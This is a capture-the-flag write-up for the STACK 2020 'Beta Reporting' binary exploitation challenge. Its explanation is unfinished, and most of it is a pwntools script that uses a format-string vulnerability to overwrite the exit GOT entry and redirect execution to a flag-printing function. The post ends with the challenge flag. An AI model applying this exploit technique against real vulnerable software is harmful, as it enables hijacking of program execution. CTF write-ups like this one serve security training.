---
title: "STACK 2020 - Beta Reporting (Pwn)"
header:
  overlay_image: /assets/images/stack-2020/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Steve Johnson"

tags:
  - stack
  - writeup
  - pwn
  - format string
---

Summary: A format string attack allows us to overwrite an entry in the GOT to redirect execution to a print flag function.

![Challenge description]({{ site.url }}{{ site.baseurl }}/assets/images/stack-2020/45BF71893F2FAEC58FC6BD02469194FC.jpg){: .align-center}

```
Beta reporting system
988 BINARY EXPLOITATION
21 SOLVES

DESCRIPTION
The developer working for COViD that we arrested refused to talk, but we found a program that he was working on his laptop. His notes have led us to the server where the beta is currently being hosted. It is likely that there are bugs in it as it is a beta.

Note: ASLR is enabled on the OS. PIE is not enabled.

Please view this Document for download instructions.

nc yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg 30121

This challenge:
- Is eligible for Awesome Write-ups Award
```

Full writeup to be completed...

Exploit script:

```python
#!/usr/bin/env python

'''
Beta Reporting Solver
'''

from pwn import *

context.update(arch='i386', os='linux')
context.log_level = 'debug'


def main():
    # p = process("./beta_reporting")
    p = remote('yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg', 30121)

    # Call the magic function to place the 'flag' string in the magic variable.
    p.recvuntil('Enter your choice:')
    p.sendline('4')

    # Construct the format string to write the address of unknownfunction into exit GOT.
    # Add a small offset for reasons.
    unknownfunction = 0x80488f7
    exit_got = 0x804b028
    fmtstr, payload = fmtstr_split(11, {exit_got: unknownfunction}, write_size='short')
    log.info('Format String: {}'.format(fmtstr))
    log.info('Payload: {}'.format(payload))
    p.sendline('1')
    p.sendline(fmtstr)
    p.recvuntil('Enter your choice:')

    # Trigger the printf and pass the addresses.
    p.sendline('2')
    p.recvuntil('Please enter your name: ')
    p.sendline(payload)
    p.recvuntil('Please enter report number or press 0 to return to menu:')
    p.sendline('1')
    p.recvuntil('Please enter report number or press 0 to return to menu:')
    p.sendline('0')
    p.recvuntil('Enter your choice:')

    # print(p.proc.pid)
    # input()

    # Trigger the overwritten exit.
    p.sendline('5')

    # Get one line.
    log.success('Flag: {}'.format(p.recvuntil('}')))


if __name__ == '__main__':
    main()
```

**Flag:** `govtech-csg{c0v1d_5y5tem_d0wn!}`
